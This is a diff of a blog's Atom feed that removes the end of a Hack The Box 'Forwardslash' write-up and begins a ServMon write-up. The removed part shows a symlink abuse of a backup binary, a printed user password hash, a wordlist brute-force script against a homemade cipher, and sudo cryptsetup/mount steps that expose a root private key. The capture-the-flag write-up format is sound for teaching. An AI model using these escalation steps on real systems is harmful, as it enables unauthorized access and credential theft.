-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/var/backups/config.php.bak&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/backup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It must be executed in the home dir of chiv&lt;/p&gt;
-
-&lt;p&gt;Creds of pain:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pain:db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&lt;/code&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;getting-root&quot;&gt;Getting root&lt;/h1&gt;
-
-&lt;p&gt;Now we can SSH as pain and find a the **encryptinator **that was made by our friend chiv:&lt;/p&gt;
-
-&lt;p&gt;Source code:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;reversed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;reversed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))):&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As well as a Ciphertext:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;,L
-&amp;gt;2Xբ
-|?I)E-˒\/;y[w#M2ʐY@'缘泣,P@5f$\*rwF3gX}i6~KY'%e&amp;gt;xo+g/K&amp;gt;^Nke
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I tried to understand the cipher and how it works out, but in the end i was curios if it was bruteforceable and voilà it worked:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def decrypt(key, msg):
-    file = open(&quot;/usr/share/wordlists/rockyou.txt&quot;)    
-    for line in file:
-        line = list(line)
-        with io.open('ciphertext', 'rb') as f:
-            msg = f.read()
-            msg = list(msg)
-            for i in range(len(msg)):
-                msg[i] = chr(msg[i])
-            for char_key in reversed(line):
-                for i in reversed(range(len(msg))):
-                    msg[i] = chr((ord(msg[i]) - (ord(char_key)+ord(msg[i-1])))%256)
-        print(''.join(msg) + '\n')
-
-decrypt(&quot;REDACTED&quot;, &quot;asd&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Executing it gives the following password:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 file.py | strings -n 25&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;The found key was: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thismypassword&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Now we can decrypt the cipher to receive some strange password:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cB!6%sdH8Lj^@Y\*$C2cf&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Now that we did that, we remember that there was a file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups/recovery&lt;/code&gt;, a LUKS encrypted file that contains something that we want.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/e12a8779-f0d0-4724-8ba3-0e35633f3932/52f919a6-7a02-44b0-b9c1-a20eeaec1c9a.png&quot; alt=&quot;52f919a6-7a02-44b0-b9c1-a20eeaec1c9a.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Checking the SUDO permissions, we can do the following:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User pain may run the following commands on forwardslash:
-    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
-    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
-    (root) NOPASSWD: /bin/umount ./mnt/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now that means that we can move to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/mapper/&lt;/code&gt; and create a backup file using the image:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /dev/mapper/
-sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
-mkdir /tmp/mnt
-cd /tmp
-sudo /bin/mount /dev/mapper/backup ./mnt/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;When looking into our mount file, we can now see that we have a private key - the only user that is left is root, so we know have successfully rooted the forwardslash!&lt;/p&gt;
-
-&lt;p&gt;root-private key:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://files.nuclino.com/files/4a493eb9-86e7-4891-9399-2e41ab32432f/id_rsa&quot;&gt;id_rsa&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box Forwardslash from Hack The Box</summary></entry><entry><title type="html">HackThebox - ServMon</title><link href="http://localhost:4000/boxes/ServMon/" rel="alternate" type="text/html" title="HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/ServMon</id><content type="html" xml:base="http://localhost:4000/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box PlayerTwo from Hack The Box</summary></entry><entry><title type="html">HackThebox - ServMon</title><link href="http://localhost:4000/boxes/ServMon/" rel="alternate" type="text/html" title="HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/ServMon</id><content type="html" xml:base="http://localhost:4000/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;This is an interesting box as it has gotten a lot of heat - mostly due to the steps required for root - and I can see why: The web interface might be slowish and buggy under load but also people can mess with each other - pushing the frustration. As this includes overwriting others’ files I think this box teaches what I call &lt;em&gt;gentleman behaviour&lt;/em&gt;. Try to not mess with other peoples stuff when working on the same box.&lt;/p&gt;
 &lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
 &lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan reveals&lt;/p&gt;
